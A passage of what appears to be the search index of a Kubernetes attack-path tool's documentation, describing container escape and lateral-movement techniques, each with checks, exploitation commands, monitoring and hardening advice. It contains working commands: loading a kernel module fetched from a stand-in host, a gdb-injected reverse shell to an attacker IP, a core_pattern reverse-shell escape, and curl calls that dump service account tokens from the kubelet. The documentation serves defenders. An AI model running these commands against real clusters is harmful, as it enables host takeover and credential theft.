trivial and powerful container escape.</p>"},{"location":"reference/attacks/CE_MODULE_LOAD/#prerequisites","title":"Prerequisites","text":"<p>Execution within a container process with the <code>CAP_SYS_MODULE</code> capability enabled.</p> <p>See the example pod spec.</p>"},{"location":"reference/attacks/CE_MODULE_LOAD/#checks","title":"Checks","text":"<p>From within a running container, determine whether it is running with <code>CAP_SYS_MODULE</code>:</p> <pre><code># Check the current process' capabilities\ncat /proc/self/status | grep CapEff\n# CapEff:   00000000a80425fb\n\n# Decode the capabilities (on current box or offline) and check for CAP_SYS_MODULE\n# NOTE: can install capsh via apt-get update &amp;&amp; apt-get install libcap2-bin\ncapsh --decode=00000000a80425fb | grep cap_sys_module\n</code></pre>"},{"location":"reference/attacks/CE_MODULE_LOAD/#exploitation","title":"Exploitation","text":"<p>Download a pre-compiled kernel module suitable for the target OS/architecture (see examples) and load from within the container:</p> <pre><code>curl -O exploit.delivery/bad.ko\ninsmod bad.ko\n</code></pre>"},{"location":"reference/attacks/CE_MODULE_LOAD/#defences","title":"Defences","text":""},{"location":"reference/attacks/CE_MODULE_LOAD/#monitoring","title":"Monitoring","text":"<ul> <li>Monitor for unfamiliar kernel modules loaded or kernel modules loaded from within a running pod which should both be high-fidelity signals of malicious activity.</li> </ul>"},{"location":"reference/attacks/CE_MODULE_LOAD/#implement-security-policies","title":"Implement security policies","text":"<p>Use a pod security policy or admission controller to prevent or limit the creation of pods with additional powerful capabilities.</p>"},{"location":"reference/attacks/CE_MODULE_LOAD/#least-privilege","title":"Least Privilege","text":"<p>Avoid running containers as the <code>root</code> user. Enforce running as an unprivileged user account using the <code>runAsNonRoot</code> setting inside <code>securityContext</code> (or explicitly setting <code>runAsUser</code> to an unprivileged user). Additionally, ensure that <code>allowPrivilegeEscalation: false</code> is set in <code>securityContext</code> to prevent a container running as an unprivileged user from being able to escalate to running as the <code>root</code> user.</p>"},{"location":"reference/attacks/CE_MODULE_LOAD/#calculation","title":"Calculation","text":"<ul> <li>EscapeModuleLoad</li> </ul>"},{"location":"reference/attacks/CE_MODULE_LOAD/#references","title":"References:","text":"<ul> <li>Compendium Of Container Escapes</li> <li>Linux Privilege Escalation - Exploiting Capabilities - StefLan's Security Blog</li> <li>Module Load Breakout</li> </ul>"},{"location":"reference/attacks/CE_NSENTER/","title":"CE_NSENTER","text":""},{"location":"reference/attacks/CE_NSENTER/#ce_nsenter","title":"CE_NSENTER","text":"Source Destination MITRE ATT&amp;CK Container Node Escape to Host, T1611 <p>Container escape via the nsenter built-in linux program that allows executing a binary into another namespace.</p>"},{"location":"reference/attacks/CE_NSENTER/#details","title":"Details","text":"<p>When both <code>hostPID: true</code> and <code>privileged: true</code> are set, the pod can see all of the processes on the host, and you can enter the init system (PID 1) on the host, and execute your shell on the node </p>"},{"location":"reference/attacks/CE_NSENTER/#prerequisites","title":"Prerequisites","text":"<p>Execution within a container process created with <code>--privileged</code> AND the <code>--pid=host</code> enabled.</p> <p>See the example pod spec.</p>"},{"location":"reference/attacks/CE_NSENTER/#checks","title":"Checks","text":"<p>There is no straightforward way to detect if <code>hostPID</code> is activated from a container. The only way is to detect host program running from a pod. The most common way is to look for the <code>kubelet</code> binary running:</p> <pre><code>ps -ef | grep kubelet\n</code></pre>"},{"location":"reference/attacks/CE_NSENTER/#exploitation","title":"Exploitation","text":"<p><code>nsenter</code> is a tool that allows us to enter the namespaces of one or more other processes and then executes a specified program. When you exec a binary into a container using the docker exec command:</p> <pre><code>docker exec -it --user root &lt;container name&gt; sh\n</code></pre> <p>You could do the same with nsenter: + Target a specific container + Look for PID of the targetted container + Execute <code>nsenter</code> of this specific PID and ask for all namespaces</p> <pre><code>docker ps | grep &lt;container name&gt;\nCONTAINER_PID=$(docker inspect &lt;container name&gt; --format='{{ .State.Pid }}')\nsudo nsenter -t $CONTAINER_PID -m -u -n -i -p sh\n</code></pre> <p>So to escape from a container and access the pod you just run, you need to target running on the host as root (PID of 1 is running the init for the host) ask for all the namespaces:</p> <pre><code>nsenter --target 1 --mount --uts --ipc --net --pid -- bash\n</code></pre> <p>The options <code>-m -u -n -i -p</code> are referring to the various namespaces that you want to access (e.g mount, UTS, IPC, net, pid).</p>"},{"location":"reference/attacks/CE_NSENTER/#defences","title":"Defences","text":""},{"location":"reference/attacks/CE_NSENTER/#monitoring","title":"Monitoring","text":"<ul> <li>Monitor for the use of the nsenter binary.</li> <li>Monitor the <code>setns</code> syscall</li> </ul>"},{"location":"reference/attacks/CE_NSENTER/#implement-security-policies","title":"Implement security policies","text":"<p>Use a pod security policy or admission controller to prevent or limit the creation of pods with <code>privileged</code> or <code>hostPid</code> enabled.</p>"},{"location":"reference/attacks/CE_NSENTER/#least-privilege","title":"Least Privilege","text":"<p>Avoid running containers as the <code>root</code> user. Enforce running as an unprivileged user account using the <code>runAsNonRoot</code> setting inside <code>securityContext</code> (or explicitly setting <code>runAsUser</code> to an unprivileged user). Additionally, ensure that <code>allowPrivilegeEscalation: false</code> is set in <code>securityContext</code> to prevent a container running as an unprivileged user from being able to escalate to running as the <code>root</code> user.</p>"},{"location":"reference/attacks/CE_NSENTER/#calculation","title":"Calculation","text":"<ul> <li>EscapeNsenter</li> </ul>"},{"location":"reference/attacks/CE_NSENTER/#references","title":"References:","text":"<ul> <li>nsenter(1) - Linux manual page</li> <li>Bad Pod #2: Privilege and HostPid</li> <li>Debugging containers using nsenter</li> </ul>"},{"location":"reference/attacks/CE_PRIV_MOUNT/","title":"CE_PRIV_MOUNT","text":""},{"location":"reference/attacks/CE_PRIV_MOUNT/#ce_priv_mount","title":"CE_PRIV_MOUNT","text":"Source Destination MITRE ATT&amp;CK Container Node Escape to Host, T1611 <p>Mount the host disk and gain access to the host via arbitrary filesystem write</p>"},{"location":"reference/attacks/CE_PRIV_MOUNT/#details","title":"Details","text":"<p>A container running with <code>privileged: true</code> disables almost all the container isolation mechanisms. As such an attacker can trivially gain access to the host's resources, including the disk, to escape the container. In this attack, we simply list the disks on the host machine, mount them into the container and exploit a privileged file write to gain execution on the host.</p>"},{"location":"reference/attacks/CE_PRIV_MOUNT/#prerequisites","title":"Prerequisites","text":"<p>Execution within a privileged container process.</p> <p>See the example pod spec.</p>"},{"location":"reference/attacks/CE_PRIV_MOUNT/#checks","title":"Checks","text":"<p>From within a running container, determine whether it is running with as privileged by examining capabilities:</p> <pre><code># Check the current process' capabilities\ncat /proc/self/status | grep CapEff\n# CapEff: 000001ffffffffff\n\n# Decode the capabilities (on current box or offline) and check for CAP_SYS_ADMIN\n# NOTE: can install capsh via apt-get update &amp;&amp; apt-get install libcap2-bin\ncapsh --decode=000001ffffffffff | grep cap_sys_admin\n</code></pre> <p>Check that the host disks are visible to our container process:</p> <pre><code>apt update &amp;&amp; apt install fdisk\nfdisk -l \n# -&gt; /dev/vda1\n</code></pre>"},{"location":"reference/attacks/CE_PRIV_MOUNT/#exploitation","title":"Exploitation","text":"<p>Mount the disks into the container</p> <pre><code>mkdir -p /mnt/hostfs\nmount /dev/vda1 /mnt/hostfs\nls -lah /mnt/hostfs/\n</code></pre> <p>With the disk now writeable from the container, follow the steps in EXPLOIT_HOST_WRITE.</p>"},{"location":"reference/attacks/CE_PRIV_MOUNT/#defences","title":"Defences","text":""},{"location":"reference/attacks/CE_PRIV_MOUNT/#monitoring","title":"Monitoring","text":"<ul> <li>Monitor <code>mount</code> events originating from containers</li> <li>See EXPLOIT_HOST_WRITE</li> </ul>"},{"location":"reference/attacks/CE_PRIV_MOUNT/#implement-security-policies","title":"Implement security policies","text":"<p>Use a pod security policy or admission controller to prevent or limit the creation of pods with <code>privileged</code> enabled.</p>"},{"location":"reference/attacks/CE_PRIV_MOUNT/#least-privilege","title":"Least Privilege","text":"<p>Avoid running containers as the <code>root</code> user. Enforce running as an unprivileged user account using the <code>runAsNonRoot</code> setting inside <code>securityContext</code> (or explicitly setting <code>runAsUser</code> to an unprivileged user). Additionally, ensure that <code>allowPrivilegeEscalation: false</code> is set in <code>securityContext</code> to prevent a container running as an unprivileged user from being able to escalate to running as the <code>root</code> user.</p>"},{"location":"reference/attacks/CE_PRIV_MOUNT/#calculation","title":"Calculation","text":"<ul> <li>EscapePrivMount</li> </ul>"},{"location":"reference/attacks/CE_PRIV_MOUNT/#references","title":"References:","text":"<ul> <li>Bad Pods: Kubernetes Pod Privilege Escalation</li> <li>7 Ways to Escape a Container</li> </ul>"},{"location":"reference/attacks/CE_SYS_PTRACE/","title":"CE_SYS_PTRACE","text":""},{"location":"reference/attacks/CE_SYS_PTRACE/#ce_sys_ptrace","title":"CE_SYS_PTRACE","text":"Source Destination MITRE ATT&amp;CK Container Node Escape to Host, T1611 <p>Given the requisite capabilities, abuse the legitimate OS debugging mechanisms to escape the container via attaching to a node process.</p>"},{"location":"reference/attacks/CE_SYS_PTRACE/#details","title":"Details","text":"<p>The <code>SYS_PTRACE</code> capability, which allows the use of <code>ptrace()</code>. This system call allows a process to monitor and control the execution of another process.</p>"},{"location":"reference/attacks/CE_SYS_PTRACE/#prerequisites","title":"Prerequisites","text":"<p>To perform this attack, the container must be started with the option <code>hostPID: true</code>, which enables the sharing of the PID address space between the container and the host operating system, allowing the container process to see every other process running on the host. And the container needs to be granted <code>SYS_PTRACE</code> and <code>SYS_ADMIN</code> capabilities.</p> <p>Since Kubernetes 1.31.0, AppArmor is enabled by default, which allows ptrace to target processes only on the same pod. This adds another requirement, the container needs the <code>Unconfined</code> AppArmor profile.</p> <p>Or, it can be started with the option <code>privileged: true</code>, which grants all capabilities and disables AppArmor</p> <p>See the example pod spec.</p>"},{"location":"reference/attacks/CE_SYS_PTRACE/#checks","title":"Checks","text":"<p>From within a running container, determine whether it is running with the required capabilities:</p> <pre><code># Check the current process' capabilities\ncat /proc/self/status | grep CapEff\n# CapEff:   00000000a80425fb\n\n# Decode the capabilities (on current box or offline) and check for CAP_SYS_PTRACE and CAP_SYS_ADMIN\n# NOTE: can install capsh via apt-get update &amp;&amp; apt-get install libcap2-bin\ncapsh --decode=00000000a80425fb | grep cap_sys_admin\ncapsh --decode=00000000a80425fb | grep cap_sys_ptrace\n\n# Check AppArmor status - if you see for instance `cri-containerd.apparmor.d (enforce)`, ptrace will\n# fail with Permission Denied\ncat /proc/self/attr/current\n</code></pre>"},{"location":"reference/attacks/CE_SYS_PTRACE/#exploitation","title":"Exploitation","text":"<p>Install a debugger into the container:</p> <p><pre><code>apt update &amp;&amp; apt install gdb\n</code></pre> Find a host process to target:</p> <pre><code>ps -ef # select a PID\n</code></pre> <p>Attach to the process and inject a shell command:</p> <pre><code>gdb -p &lt;PID&gt;\ncall (void)system(\"bash -c 'bash -i &gt;&amp; /dev/tcp/&lt;attacker_ip&gt;/&lt;attacker_port&gt; 0&gt;&amp;1'\")\n</code></pre>"},{"location":"reference/attacks/CE_SYS_PTRACE/#defences","title":"Defences","text":""},{"location":"reference/attacks/CE_SYS_PTRACE/#monitoring","title":"Monitoring","text":"<ul> <li>Monitor for GDB (or other debugging tools) installation. </li> <li>Detect invocation of ptrace() from within a container.</li> </ul>"},{"location":"reference/attacks/CE_SYS_PTRACE/#implement-security-policies","title":"Implement security policies","text":"<p>Use a pod security policy or admission controller to prevent or limit the creation of pods with additional powerful capabilities.</p>"},{"location":"reference/attacks/CE_SYS_PTRACE/#least-privilege","title":"Least Privilege","text":"<p>Avoid running containers as the <code>root</code> user. Enforce running as an unprivileged user account using the <code>runAsNonRoot</code> setting inside <code>securityContext</code> (or explicitly setting <code>runAsUser</code> to an unprivileged user). Additionally, ensure that <code>allowPrivilegeEscalation: false</code> is set in <code>securityContext</code> to prevent a container running as an unprivileged user from being able to escalate to running as the <code>root</code> user.</p>"},{"location":"reference/attacks/CE_SYS_PTRACE/#calculation","title":"Calculation","text":"<ul> <li>EscapeSysPtrace</li> </ul>"},{"location":"reference/attacks/CE_SYS_PTRACE/#references","title":"References:","text":"<ul> <li>Container Escape: All You Need is Cap (Capabilities)</li> </ul>"},{"location":"reference/attacks/CE_UMH_CORE_PATTERN/","title":"CE UMH CORE PATTERN","text":""},{"location":"reference/attacks/CE_UMH_CORE_PATTERN/#ce_umh_core_pattern","title":"CE_UMH_CORE_PATTERN","text":"<p>Container escape via the <code>core_pattern</code> <code>usermode_helper</code> in the case of an exposed <code>/proc</code> mount.</p> Source Destination MITRE ATT&amp;CK Container Node Escape to Host, T1611"},{"location":"reference/attacks/CE_UMH_CORE_PATTERN/#details","title":"Details","text":"<p>/proc/sys/kernel/core_pattern defines a program which is executed on core-file generation (typically a program crash) and is passed the core file as standard input if the first character of this file is a pipe symbol <code>|</code>. This program is run by the root user and will allow up to 128 bytes of command line arguments. Attacker control of this progam would allow trivial code execution within the container host given any crash and core file generation (which can be simply discarded during a myriad of malicious actions). With write access to the host <code>/proc</code> directory and no additional privileges, an attacker can abuse this to escape a container and gain root on the containing K8s node.</p>"},{"location":"reference/attacks/CE_UMH_CORE_PATTERN/#prerequisites","title":"Prerequisites","text":"<p>Execution within a container process with the host <code>/proc/sys/kernel</code> (or any parent directory) mounted inside the container.</p> <p>See the example pod spec.</p>"},{"location":"reference/attacks/CE_UMH_CORE_PATTERN/#checks","title":"Checks","text":"<p>Determine mounted volumes within the container as per VOLUME_DISCOVER. If the host <code>/proc/sys/kernel</code> (or any parent directory) is mounted, this attack will be possible. Example below.</p> <pre><code>$ cat /proc/self/mounts \n\n...\nproc /hostproc proc rw,nosuid,nodev,noexec,relatime 0 0\n...\n</code></pre>"},{"location":"reference/attacks/CE_UMH_CORE_PATTERN/#exploitation","title":"Exploitation","text":"<p>First find the path of the container's filesystem on the host. This can be done by retrieving the current mounts (see VOLUME_DISCOVER). Looks for the <code>upperdir</code> value of the overlayfs entry associated with containerd:</p> <pre><code>$ cat /etc/mtab  # or `cat /proc/mounts` depending on the system\n...\noverlay / overlay rw,relatime,lowerdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/27/fs,upperdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/71/fs,workdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/71/work 0 0\n...\n\n# Store path in a variable for future use\n$ OVERLAY_PATH=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/71/fs\n</code></pre> <p>Oneliner alternative:</p> <pre><code>export OVERLAY_PATH=$(cat /proc/mounts | grep -oe upperdir=\"[^,]*,\" | cut -d = -f 2 | tr -d , | head -n 1)\n</code></pre> <p>Next create a mini program that will crash immediately and generate a kernel coredump. For example:</p> <pre><code>echo 'int main(void) {\n    char buf[1];\n    for (int i = 0; i &lt; 100; i++) {\n        buf[i] = 1;\n    }\n    return 0;\n}' &gt; /tmp/crash.c \n</code></pre> <p>Compile the program and copy the binary into the container as crash: <pre><code>apt update &amp;&amp; apt install gcc\ngcc -o crash /tmp/crash.c\n</code></pre></p> <p>Next write a shell script to be triggered inside the container's file system as <code>shell.sh</code>:</p> <pre><code># Reverse shell\nREVERSE_IP=$(hostname -I | tr -d \" \") &amp;&amp; \\\necho '#!/bin/sh' &gt; /tmp/shell.sh\necho \"sh -i &gt;&amp; /dev/tcp/${REVERSE_IP}/9000 0&gt;&amp;1\" &gt;&gt; /tmp/shell.sh &amp;&amp; \\\nchmod a+x /tmp/shell.sh\n</code></pre> <p>Finally write the <code>usermode_helper</code> script path to the <code>core_pattern</code> helper path and trigger the container escape:</p> <pre><code># move to mounted folder with /proc\ncd /sysproc\necho \"|$OVERLAY_PATH/tmp/shell.sh\" &gt; core_pattern\ncd\napt install netcat-traditional\nsleep 5 &amp;&amp; ./crash &amp; nc -l -vv -p 9000\n</code></pre>"},{"location":"reference/attacks/CE_UMH_CORE_PATTERN/#defences","title":"Defences","text":""},{"location":"reference/attacks/CE_UMH_CORE_PATTERN/#monitoring","title":"Monitoring","text":"<ul> <li>Use the Datadog agent to monitor for creation of new <code>usermode_helper</code> programs via writes to known locations, in this case <code>/proc/sys/kernel/core_pattern</code>.</li> </ul>"},{"location":"reference/attacks/CE_UMH_CORE_PATTERN/#implement-security-policies","title":"Implement security policies","text":"<p>Use a pod security policy or admission controller to prevent or limit the creation of pods with a <code>hostPath</code> mount of <code>/proc</code> or other sensitive locations.</p>"},{"location":"reference/attacks/CE_UMH_CORE_PATTERN/#least-privilege","title":"Least Privilege","text":"<p>Avoid running containers as the <code>root</code> user. Enforce running as an unprivileged user account using the <code>runAsNonRoot</code> setting inside <code>securityContext</code> (or explicitly setting <code>runAsUser</code> to an unprivileged user). Additionally, ensure that <code>allowPrivilegeEscalation: false</code> is set in <code>securityContext</code> to prevent a container running as an unprivileged user from being able to escalate to running as the <code>root</code> user.</p>"},{"location":"reference/attacks/CE_UMH_CORE_PATTERN/#calculation","title":"Calculation","text":"<ul> <li>EscapeUmhCorePattern</li> </ul>"},{"location":"reference/attacks/CE_UMH_CORE_PATTERN/#references","title":"References:","text":"<ul> <li>Compendium Of Container Escapes</li> <li>Sensitive Mounts</li> <li>Escaping privileged containers for fun</li> </ul>"},{"location":"reference/attacks/CE_VAR_LOG_SYMLINK/","title":"CE_VAR_LOG_SYMLINK","text":""},{"location":"reference/attacks/CE_VAR_LOG_SYMLINK/#ce_var_log_symlink","title":"CE_VAR_LOG_SYMLINK","text":"Source Destination MITRE ATT&amp;CK Container Node Escape to Host, T1611 <p>Arbitrary file reads on the host from a node via an exposed <code>/var/log</code> mount.</p>"},{"location":"reference/attacks/CE_VAR_LOG_SYMLINK/#details","title":"Details","text":"<p>A pod running as root and with a mount point to the node's <code>/var/log</code> directory can expose the entire contents of its host filesystem to any user who has access to its logs, enabling an attacker to read arbitrary files on the host node. See Kubernetes Pod Escape Using Log Mounts for a more detailed explanation of the technique.</p>"},{"location":"reference/attacks/CE_VAR_LOG_SYMLINK/#prerequisites","title":"Prerequisites","text":"<p>Execution as root within a container process with the host <code>/var/log/</code> (or any parent directory) mounted inside the container.</p> <p>See the example pod spec.</p>"},{"location":"reference/attacks/CE_VAR_LOG_SYMLINK/#checks","title":"Checks","text":"<p>Determine mounted volumes within the container as per VOLUME_DISCOVER If the host <code>/var/log</code> (or any parent directory) is mounted, this attack will be possible. Example output below:</p> <pre><code>cat /proc/self/mounts\n\n...\n/dev/vda1 on /host/var/log type ext4 (rw,relatime)\n...\n</code></pre> <pre><code># Examine the directory structure of any hostPath mounts to verify it is the log directory\nls -la /host/var/log\ntotal 24\ndrwxr-xr-x 5 root root 4096 Mar  2 09:49 .\ndrwxr-xr-x 3 root root 4096 Mar  8 10:31 ..\n-rw-r--r-- 1 root root  775 Mar  4 18:13 alternatives.log\ndrwxr-xr-x 2 root root 4096 Mar  8 10:46 containers\ndrwxr-xr-x 3 root root 4096 Mar  2 09:49 kubernetes\ndrwxr-xr-x 8 root root 4096 Mar  8 10:31 pods\n\nls -la /host/var/log/pods\ntotal 32\ndrwxr-xr-x  8 root root 4096 Mar  8 10:31 .\ndrwxr-xr-x  5 root root 4096 Mar  2 09:49 ..\ndrwxr-xr-x  3 root root 4096 Mar  8 10:31 default_log-escape-pod_f262a349-c3bb-4561-9496-c3182f8d1256\n</code></pre>"},{"location":"reference/attacks/CE_VAR_LOG_SYMLINK/#exploitation","title":"Exploitation","text":"<p>Setup the symlink:</p> <pre><code>ln -s / /host/var/log/root_link\n</code></pre> <p>Call the kubelet API to read the \"logs\" and extract pod service account tokens:</p> <pre><code>$ KUBE_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\n$ NODEIP=$(ip route | awk '/^default/{print $3}')\n# On Amazon EKS, if you have access to the IMDS: NODEIP=$(curl http://169.254.169.254/latest/meta-data/local-ipv4)\n\n# Find all the pods\n$ curl -sk -H \"Authorization: Bearer $KUBE_TOKEN\" https://$NODEIP:10250/logs/root_link/var/lib/kubelet/pods/\n\n# &lt;pre&gt;\n# &lt;a href=\"10b90d62-6b16-4aa7-9e72-75f18dcca5a8/\"&gt;10b90d62-6b16-4aa7-9e72-75f18dcca5a8/&lt;/a&gt;\n# &lt;a href=\"2254e754-fbe0-48c4-b0c8-236a232fa510/\"&gt;2254e754-fbe0-48c4-b0c8-236a232fa510/&lt;/a&gt;\n# &lt;a href=\"324fe80e-e10e-462b-b046-be4c15e91b4e/\"&gt;324fe80e-e10e-462b-b046-be4c15e91b4e/&lt;/a&gt;\n# &lt;a href=\"5a9fc508-8410-444a-bf63-9f11e5979bee/\"&gt;5a9fc508-8410-444a-bf63-9f11e5979bee/&lt;/a&gt;\n# &lt;a href=\"a1176593-34a2-43e6-8bdd-ed10fa148fe7/\"&gt;a1176593-34a2-43e6-8bdd-ed10fa148fe7/&lt;/a&gt;\n# &lt;a href=\"a83a37cf-01ea-4b4c-ad19-f67e374cf255/\"&gt;a83a37cf-01ea-4b4c-ad19-f67e374cf255/&lt;/a&gt;\n# &lt;a href=\"dfbf38ad-2e92-44e0-b05b-8859350b6ea5/\"&gt;dfbf38ad-2e92-44e0-b05b-8859350b6ea5/&lt;/a&gt;\n# &lt;/pre&gt;\n\n# Dump the token\n$ curl -sk -H \"Authorization: Bearer $KUBE_TOKEN\" https://$NODEIP:10250/logs/root_link/var/lib/kubelet/pods/10b90d62-6b16-4aa7-9e72-75f18dcca5a8/volumes/kubernetes.io~projected/kube-api-access-j7dsp/token\n\n# eyJhbGciOiJSUzI1NiIsImtpZCI6I****REDACTED****\n</code></pre> <p>Cleanup the symlink when exploitation is complete:</p> <pre><code>rm /host/var/log/root_link\n</code></pre> <p>NOTE: the above assumes the serviceaccount has access to read logs. If not replace the token for any user token which should normally have logs access.</p>"},{"location":"reference/attacks/CE_VAR_LOG_SYMLINK/#defences","title":"Defences","text":""},{"location":"reference/attacks/CE_VAR_LOG_SYMLINK/#monitoring","title":"Monitoring","text":"<ul> <li>Monitor for suspicious symlink creation in the <code>/var/log</code> directory.</li> </ul>"},{"location":"reference/attacks/CE_VAR_LOG_SYMLINK/#implement-security-policies","title":"Implement security policies","text":"<p>Use a pod security policy or admission controller to prevent or limit the creation of pods with a <code>hostPath</code> mount of <code>/var/log</code> or other sensitive locations.</p>"},{"location":"reference/attacks/CE_VAR_LOG_SYMLINK/#least-privilege","title":"Least Privilege","text":"<p>Avoid running containers as the <code>root</code> user. Enforce running as an unprivileged user account using the <code>runAsNonRoot</code> setting inside <code>securityContext</code> (or explicitly setting <code>runAsUser</code> to an unprivileged user). Additionally, ensure that <code>allowPrivilegeEscalation: false</code> is set in <code>securityContext</code> to prevent a container running as an unprivileged user from being able to escalate to running as the <code>root</code> user.</p>"},{"location":"reference/attacks/CE_VAR_LOG_SYMLINK/#calculation","title":"Calculation","text":"<ul> <li>EscapeVarLogSymlink</li> </ul>"},{"location":"reference/attacks/CE_VAR_LOG_SYMLINK/#references","title":"References:","text":"<ul> <li>Kubernetes Pod Escape Using Log Mounts </li> <li>Kubelet API \u00b7 Deep Network</li> </ul>"},{"location":"reference/attacks/CONTAINER_ATTACH/","title":"CONTAINER_ATTACH","text":""},{"location":"reference/attacks/CONTAINER_ATTACH/#container_attach","title":"CONTAINER_ATTACH","text":"Source Destination MITRE ATT&amp;CK Pod Container Container Administration Command, T1609 <p>Attach to a container running within a pod given access to the pod.</p>"},{"location":"reference/attacks/CONTAINER_ATTACH/#details","title":"Details","text":"<p>In order to attach a container running in a pod, you can create a debugging container with the <code>kubectl debug</code> command. It will spawn an ephemeral container that will attach to the console. To do so you need: + The target pod + The image to spawn as an ephemeral container</p> <p>In order to access the target process, you need the id of the targeted container. Then by using the  <code>--target</code> flag, the ephemeral container will share the linux process namespace with the target By default, the process namespace is not shared between containers in a pod.</p>"},{"location":"reference/attacks/CONTAINER_ATTACH/#prerequisites","title":"Prerequisites","text":"<p>Permissions to debug the pod</p>"},{"location":"reference/attacks/CONTAINER_ATTACH/#checks","title":"Checks","text":"<p>Check if sufficient permissions to attach to pods in the namespace of the target. First find the pod's namespace and id:</p> <pre><code> kubectl get pods  --all-namespaces | grep &lt;pod name&gt;\n</code></pre> <p>Then check permissions:</p> <pre><code>kubectl auth can-i get pods/debug -n &lt;namespace&gt;\n</code></pre>"},{"location":"reference/attacks/CONTAINER_ATTACH/#exploitation","title":"Exploitation","text":"<p>Create and attach an ephemeral debugging container to the target pod via:</p> <pre><code>kubectl debug -it &lt;pod name&gt; --image=busybox:1.28 --target=&lt;target container&gt;\n</code></pre> <p>To determine the containers running in the pod (required to set a target above), you can use:</p> <pre><code>kubectl describe pod &lt;pod name&gt;\n</code></pre>"},{"location":"reference/attacks/CONTAINER_ATTACH/#defences","title":"Defences","text":""},{"location":"reference/attacks/CONTAINER_ATTACH/#monitoring","title":"Monitoring","text":"<ul> <li>Monitor K8s audit logs for pod debug events as these should be fairly unusual, but may be triggered by legitimate SRE or developer activities.</li> </ul>"},{"location":"reference/attacks/CONTAINER_ATTACH/#calculation","title":"Calculation","text":"<ul> <li>ContainerAttach</li> </ul>"},{"location":"reference/attacks/CONTAINER_ATTACH/#references","title":"References:","text":"<ul> <li>Official Kubernetes Documentation</li> </ul>"},{"location":"reference/attacks/ENDPOINT_EXPLOIT/","title":"ENDPOINT_EXPLOIT","text":""},{"location":"reference/attacks/ENDPOINT_EXPLOIT/#endpoint_exploit","title":"ENDPOINT_EXPLOIT","text":"<p>Represents a network endpoint exposed by a container that could be exploited by an attacker (via means known or unknown). This can correspond to a Kubernetes service, node service, node port, or container port.</p> Source Destination MITRE ATT&amp;CK Endpoint Container Exploitation of Remote Services, T1210"},{"location":"reference/attacks/ENDPOINT_EXPLOIT/#details","title":"Details","text":"<p>Exposed endpoints represent the most common entry point for attackers into a cluster.</p>"},{"location":"reference/attacks/ENDPOINT_EXPLOIT/#prerequisites","title":"Prerequisites","text":"<p>A network endpoint exposed by a container.</p>"},{"location":"reference/attacks/ENDPOINT_EXPLOIT/#checks","title":"Checks","text":"<p>Endpoints exposed outside the cluster can be queried via <code>kubectl</code>:</p> <pre><code>kubectl get endpointslices\n</code></pre> <p>Alternatively open ports can be discovered by traditional port scanning techniques or a tool like KubeHunter</p>"},{"location":"reference/attacks/ENDPOINT_EXPLOIT/#exploitation","title":"Exploitation","text":"<p>This edge simply indicates that an endpoint is exposed by a container. It does not signal that the endpoint is exploitable but serves as a useful starting point for path traversal queries.</p>"},{"location":"reference/attacks/ENDPOINT_EXPLOIT/#defences","title":"Defences","text":"<p>None</p>"},{"location":"reference/attacks/ENDPOINT_EXPLOIT/#calculation","title":"Calculation","text":"<ul> <li>EndpointExploitInternal</li> <li>EndpointExploitExternal</li> </ul>"},{"location":"reference/attacks/ENDPOINT_EXPLOIT/#references","title":"References:","text":"<ul> <li>Official Kubernetes documentation: EndpointSlices </li> </ul>"},{"location":"reference/attacks/EXPLOIT_CONTAINERD_SOCK/","title":"EXPLOIT_CONTAINERD_SOCK","text":""},{"location":"reference/attacks/EXPLOIT_CONTAINERD_SOCK/#exploit_containerd_sock","title":"EXPLOIT_CONTAINERD_SOCK","text":"Source Destination MITRE ATT&amp;CK Container Container Deploy Container, T1610 <p>Container escape via the <code>containerd.sock</code> file that allows executing a binary into another container.</p> <p>Warning</p> <p>This attack detection is currently NOT IMPLEMENTED.</p>"},{"location":"reference/attacks/EXPLOIT_CONTAINERD_SOCK/#details","title":"Details","text":"<p>When the <code>containerd.sock</code> (or other equivalent - see the list below) is mounted inside a container, it allows the container to interact with container runtime. Therefore an attacker can execute any command in any container present in the cluster. This allows an attacker to do some lateral movement across the cluster. </p>"},{"location":"reference/attacks/EXPLOIT_CONTAINERD_SOCK/#prerequisites","title":"Prerequisites","text":"<p>Execution within a container process with the following unix socket being (or any parent directory) being mounted inside the container:</p> <pre><code>unix:///var/run/dockershim.sock\nunix:///run/containerd/containerd.sock\nunix:///run/crio/crio.sock\nunix:///var/run/cri-dockerd.sock\n</code></pre> <p> sockets mounted as readonly can still be used for this attack.  This can be demonstrated as follows:</p> <pre><code># Create an alpine container with the docker socket mounted as readonly\ndocker run -v /var/run/docker.sock:/var/run/docker.sock:ro --rm -it alpine sh\n\n# Within the alpine container execute a docker command\ndocker ps\n</code></pre> <p>See the example pod spec.</p>"},{"location":"reference/attacks/EXPLOIT_CONTAINERD_SOCK/#checks","title":"Checks","text":"<p>Look for any socket being mounted in the container by running a simple find command:</p> <pre><code>find / -name dockershim.sock -o -name containerd.sock -o -name crio.sock -o -name cri-dockerd.sock  2&gt;/dev/null\n</code></pre>"},{"location":"reference/attacks/EXPLOIT_CONTAINERD_SOCK/#exploitation","title":"Exploitation","text":"<p>To exploit this vulnerability, we will use a CLI for Kubelet Container Runtime Interface (CRI) provided by Google for debugging purposes:  crictl.</p> <pre><code>apt update &amp;&amp; apt install -f wget tar\nwget https://github.com/kubernetes-sigs/cri-tools/releases/download/v1.27.0/crictl-v1.27.0-linux-amd64.tar.gz -O /tmp/crictl.tar.gz\ntar xvf /tmp/crictl.tar.gz -C /tmp\n</code></pre> <p>This tools allows to interact with Kubernetes using a unix socket:</p> <pre><code>unix:///var/run/dockershim.sock\nunix:///run/containerd/containerd.sock\nunix:///run/crio/crio.sock\nunix:///var/run/cri-dockerd.sock\n</code></pre> <p>Once you have the path for the mounted socket, configure <code>crictl</code> to use it:</p> <pre><code>MOUNTED_SOCK_PATH=/host/run/containerd/containerd.sock \necho \"runtime-endpoint: unix://${MOUNTED_SOCK_PATH}\nimage-endpoint: unix://${MOUNTED_SOCK_PATH}\ndebug: false\" &gt; /tmp/crictl.yaml &amp;&amp; alias cc='/tmp/crictl --config /tmp/crictl.yaml'\n</code></pre> <p>Once everything is configured, you should be able to run command on another container of your choice.</p> <p>To list all the pods: </p> <pre><code>cc ps -a\n</code></pre> <p>Executing a command on another pod:</p> <pre><code>cc exec -s 05c862f55a017 